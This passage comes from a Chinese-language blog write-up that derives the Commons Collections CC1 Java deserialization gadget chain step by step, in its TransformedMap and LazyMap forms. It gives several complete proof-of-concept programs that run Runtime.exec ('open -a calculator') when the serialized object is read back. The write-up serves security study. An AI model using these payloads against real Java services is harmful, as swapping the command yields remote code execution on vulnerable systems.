class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(runtime);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>); <span class="comment">// 给hash赋值，保证后面会经入遍历的那个for循环</span></span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer); <span class="comment">// 搞到decorate</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125; <span class="comment">// 主动遍历触发这个重写的setValue</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接调用decorate，返回一个TransformedMap的东西，后面遍历的时候才会进到我们要到的setValue</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap,null,invokerTransformer);</span><br></pre></td></tr></table></figure>

<p>所以现在的链子就是找到一个入口hashmap，去触发获取TransformedMap再去遍历它触发setValue函数，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashMap入口</span><br><span class="line">	-&gt; .decorate() -&gt; TransformedMap</span><br><span class="line">		-&gt; 遍历setValue()</span><br><span class="line">			-&gt;AbstractInputCheckedMapDecorator#setValue()</span><br><span class="line">				-&gt; TransformedMap#checkSetValue()</span><br><span class="line">					-&gt; InvokerTransformer#transform()</span><br></pre></td></tr></table></figure>

<h4 id="找到链首readObject"><a href="#找到链首readObject" class="headerlink" title="找到链首readObject"></a>找到链首readObject</h4><p>我们在find usage，找到有一个类里面的readObject就调用了setValue（这里还是有一些限制条件的，后面再解决）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241128222954112.png" ></p>
<p>所以按理说我们序列化<code>AnnotationInvocationHandler</code>这个类的时候就会触发<code>readObject</code>紧接着后面的链子</p>
<p>然后这个类没有写明作用域，就算是default，还是要用反射调用，理想状态下的poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>); <span class="comment">// 获取类</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class); <span class="comment">// 获取构造器</span></span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Override.class, transformedMap); <span class="comment">// 实例化</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化反序列化</span></span><br><span class="line">        serialize(o); <span class="comment">// 于是自动触发readObject</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">		&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="现在的几个问题"><a href="#现在的几个问题" class="headerlink" title="现在的几个问题"></a>现在的几个问题</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129104607762.png" ></p>
<ul>
<li>有几个if判断需要解决</li>
<li>readObject里面的setValue函数传参要怎么控制，我们要传的是Runtime对象，代码里明显和我们要做的不一样</li>
<li>Runtime.class不能序列化</li>
</ul>
<h5 id="解决Runtime不能序列化"><a href="#解决Runtime不能序列化" class="headerlink" title="解决Runtime不能序列化"></a>解决Runtime不能序列化</h5><p>Runtime不能序列化，但是Runtime.class可以，所以我们可以写一个普通反射，然后设法让InvokerTransformer调用</p>
<p>正常里说，我们的反射调用runtime.class是这么写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">        exec.invoke(runtime,<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就比较麻烦了，我们用InvokerTransformer.transform()一次一次实现我们要的效果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="comment">// getRuntime = c.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntime);</span><br><span class="line">        <span class="comment">// Runtime runtime = getRuntime.invoke(null);</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;).transform(runtime);</span><br><span class="line">        <span class="comment">// exec.invoke(runtime,&quot;open -a calculator&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每一句都是有对应的，然后一一循环调用，但是这样调用代码很冗余，于是前面有一个&#96;ChainedTransformer类，这里存在递归调用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129112729692.png" ></p>
<p>于是我们可以把代码优化成</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> chainedTransformer.transform(Runtime.class);</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure>

<p>我们new一个Transformer数组，然后用ChainedTransformer递归调用就好了，最后只用到一个transform，又解决了runtime序列化问题也不会代码冗余。</p>
<p>那再结合最开始的decorate，我们再整理一下poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class,transformedMap);</span><br><span class="line">        <span class="comment">// 序列化反序列化</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是咧还是不会弹计算机，我们跟进一下</p>
<p>断点打在AnnotationInvocationHandler里面的那个if判断，会发现它是不会进去的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129113859761.png" ></p>
<h5 id="解决if判断"><a href="#解决if判断" class="headerlink" title="解决if判断"></a>解决if判断</h5><p>这里有个memberType判断，我们要控制他不是null，看一下是什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-11-29%2011.55.13.png" ></p>
<p>这个type是我们前面构造函数里传入的注解类型的对象，图片第一个红框就是获取注解类型的成员方法</p>
<p>下面判断成员方法不能是空，我们前面传入的Override就是没有成员方法所以进不去if</p>
<p>现在我们选择传一个Target.class，里面就有一个成员变量value</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129120230319.png" ></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey(); <span class="comment">// 键值对获取key，这里这个memberValue是我们最前面传的hashMap</span></span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name); <span class="comment">// 查找key是不是空的</span></span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) || <span class="comment">// 判断能不能强转</span></span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>所以我们在最前面改成传入Target.class，这次他有成员变量，但是没有和前面的hashMap键值对对应，还是进不了if</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-11-29%2012.10.27.png" ></p>
<p>调试一下，这个memberTypes也就是我们传入的Target.class里面没有a，所以memberType还是null</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-11-29%2012.12.31.png" ></p>
<p>现在改成hashMap.put(“value”,”flowww”)，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129121540544.png" ></p>
<p>这个时候再看就不是null了，可以进入第一个if，第二个if是在判断能不能强转，也能顺利进入了</p>
<p>现在我们调试顺利来到了setValue方法</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129121912098.png" ></p>
<p>因为setValue里面的参数不可控，指定了特定的类，这限制了我们的命令执行</p>
<h5 id="进入setValue"><a href="#进入setValue" class="headerlink" title="进入setValue"></a>进入setValue</h5><p>先从头讲，我们按目前的情况进入到setValue再到checkSetValue</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129123029689.png" ></p>
<p>我们要控制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">valueTransformer.transform(value);</span><br><span class="line">=</span><br><span class="line">chainedTransformer.transform(Runtime.class); </span><br></pre></td></tr></table></figure>

<p>但是也能看到调试到这里value不是Runtime.class</p>
<p>于是最后找到一个有可控参数的类ConstantTransformer</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241129122305671.png" ></p>
<p>构造方法里，任何传入的对象都放在iConstant里</p>
<p>transform里，无论传入什么都返回iConstant，这相当于一个常量了</p>
<p>我们在最开始chainedTransformer定义的时候多加一个ConstantTransformer构造，这样后面调用transform的时候无论传入的value是什么类型都会返回我们要的Runtime.class</p>
<h4 id="最后POC"><a href="#最后POC" class="headerlink" title="最后POC"></a>最后POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;flowww&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        <span class="comment">// 序列化反序列化</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>真是呕心沥血，未完待续，还有另一条lazymap的，我要抓紧补上</p>
<h3 id="LazyMap版"><a href="#LazyMap版" class="headerlink" title="LazyMap版"></a>LazyMap版</h3><p>有一部分是一样，直到一个地方有分叉，我们可以在transform那里查看用法，可以跟踪到<code>LazyMap.get()</code>也调用了transform</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241130190835.png" ></p>
<p>跟进看一下factory是什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-11-30%2019.09.56.png" ></p>
<p>可以看到是Transformer类，而且还有前面熟悉的decorate，factory会在构造函数里出现，这个是可控的，符合我们的要求。</p>
<p>然后看一下这个类的构造函数，作用域是<code>protected</code>，所以我们需要反射调用</p>
<p>目前的链子这样是可行的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);</span><br><span class="line">        Class&lt;LazyMap&gt; clazz = LazyMap.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">LazyGet</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);</span><br><span class="line">        LazyGet.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        LazyGet.invoke(decorateMap, runtime);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后我们继续find usage，最后在 <code>AnnotationInvocationHandler.invoke()</code>函数里面找到调用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241201122517.png" ></p>
<p>而且这个类本身有readObject，这就方便了很多</p>
<p>结合这个类名，我们要触发invoke，就涉及到动态代理</p>
<blockquote>
<p>当对某个对象使用Proxy.newProxyInstance进行动态代理并传入有实现invoke的相应hanlder对象（比如这里的AnnotationInvocationHandler），当调用方法时，就会跳转到这个handler对象的invoke方法。</p>
</blockquote>
<p>我们看到readObject里面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250208154049.png" ></p>
<p>我们这里直接有一个调用，我们让<code>memberValues</code>是一个动态代理就好，他就会自动调用invoke</p>
<p>这个部分我理解了好久，先贴一个poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler1</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">                invocationHandler1);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler2</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        serialize(invocationHandler2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    